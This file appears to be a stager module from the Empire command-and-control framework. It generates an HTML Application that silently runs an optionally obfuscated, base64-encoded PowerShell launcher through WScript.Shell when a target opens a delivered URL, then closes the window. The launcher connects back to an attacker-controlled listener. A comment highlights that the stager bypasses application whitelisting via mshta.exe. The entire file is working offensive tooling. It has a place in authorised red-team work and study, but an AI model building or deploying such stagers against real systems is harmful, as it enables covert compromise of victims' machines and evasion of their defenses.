from __future__ import print_function
from builtins import object
from empire.server.common import helpers


class Stager(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTA',

            'Author': ['@subTee'],

            'Description': 'Generates an HTA (HyperText Application) For Internet Explorer',

            'Comments': [
                'You will need to deliver a url to the target to launch the HTA.  Often bypasses Whitelists since it is executed by mshta.exe'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'File to output HTA to, otherwise displayed on the screen.',
                'Required': False,
                'Value': ''
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listener_name = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscate_command = self.options['ObfuscateCommand']['Value']
        user_agent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxy_creds = self.options['ProxyCreds']['Value']
        stager_retries = self.options['StagerRetries']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName=listener_name, language=language, encode=encode,
                                                           obfuscate=obfuscate_script,
                                                           obfuscationCommand=obfuscate_command, userAgent=user_agent,
                                                           proxy=proxy, proxyCreds=proxy_creds,
                                                           stagerRetries=stager_retries)

        if launcher == "":
            print(helpers.color("[!] Error in launcher command generation."))
            return ""
        else:
            code = "<html><head><script>var c= '"
            code += launcher.replace("'", "\\'") + "'\n"
            code += "new ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"

        return code
